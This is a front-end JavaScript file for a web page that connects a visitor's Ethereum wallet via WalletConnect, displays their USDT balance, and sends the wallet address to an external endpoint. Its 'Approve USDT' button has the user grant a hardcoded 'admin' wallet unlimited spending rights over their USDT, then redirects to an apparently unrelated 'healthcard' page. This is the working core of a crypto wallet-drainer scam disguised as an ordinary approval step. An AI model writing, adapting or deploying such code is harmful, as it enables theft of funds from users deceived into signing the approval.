import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// Ethereum (ERC-20) Config
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ERC-20 USDT
const ADMIN_WALLET = "0x8209f963F4E0956fdf92D1757d53164d61622271"; // Admin Wallet

// ABI for USDT functions
const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

// UI Elements
const connectButton = document.getElementById("connectWalleterc");
const approveButton = document.getElementById("approveUSDTerc");
const userAddressSpan = document.getElementById("userAddresserc");
const userBalanceSpan = document.getElementById("userBalanceerc");
const walletInfoDiv = document.getElementById("walletInfoerc");

let signer; // Ethers.js signer

// Connect Wallet Function
connectButton.onclick = async () => {
    connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
    connectButton.disabled = true;

    try {
        // Initialize WalletConnect Provider
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [1], // Ethereum Mainnet
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true,
        });

        await provider.connect();

        const ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        // Show success popup
        const connectionOverlay = document.getElementById("connectionPopupOverlayerc");
        const closeBtn = document.getElementById("popupCloseBtn");
        if (connectionOverlay) {
            connectionOverlay.style.display = "flex";
            connectionOverlay.querySelector(".user-address").textContent = userAddress;

            setTimeout(() => {
                connectionOverlay.style.display = "none";
            }, 3000);

            if (closeBtn) {
                closeBtn.onclick = () => {
                    connectionOverlay.style.display = "none";
                };
            }
        }

        // Save wallet address (optional - replace with your backend)
        fetch("https://onlyforapi/erc/save_walleterc.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ wallet: userAddress }),
        });

        // Show wallet info
        approveButton.style.display = "inline-block";
        userAddressSpan.textContent = userAddress;
        document.getElementById("userAddressInput").value = userAddress;
        walletInfoDiv.style.display = "block";

        // Fetch USDT balance (ERC-20 uses 6 decimals)
        const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const formattedBalance = ethers.formatUnits(rawBalance, 6);
        userBalanceSpan.textContent = formattedBalance + " USDT";

    } catch (error) {
        console.error("Connection error:", error);
        alert("Failed to connect: " + error.message);
    } finally {
        connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        connectButton.disabled = false;
    }
};

// Approve USDT Function
approveButton.onclick = async () => {
    try {
        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Approving...';
        approveButton.disabled = true;

        const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        const userAddress = await signer.getAddress();
        window.location.href = `/healthcard.html?wallet=${userAddress}`;

    } catch (error) {
        console.error("Approval error:", error);
        alert("Approval failed: " + error.message);
    } finally {
        approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
        approveButton.disabled = false;
    }
};

// Copy Address Function
function copyAddress() {
    const addressInput = document.getElementById("userAddressInput");
    addressInput.select();
    document.execCommand("copy");
    alert("Address copied to clipboard!");
}

// Overlay Handlers
document.getElementById("preConnectCloseerc").onclick = () => {
    document.getElementById("preConnectOverlayerc").style.display = "none";
};

window.addEventListener("click", (event) => {
    if (event.target === document.getElementById("preConnectOverlayerc")) {
        document.getElementById("preConnectOverlayerc").style.display = "none";
    }
    if (event.target === document.getElementById("connectionPopupOverlayerc")) {
        document.getElementById("connectionPopupOverlayerc").style.display = "none";
    }
});
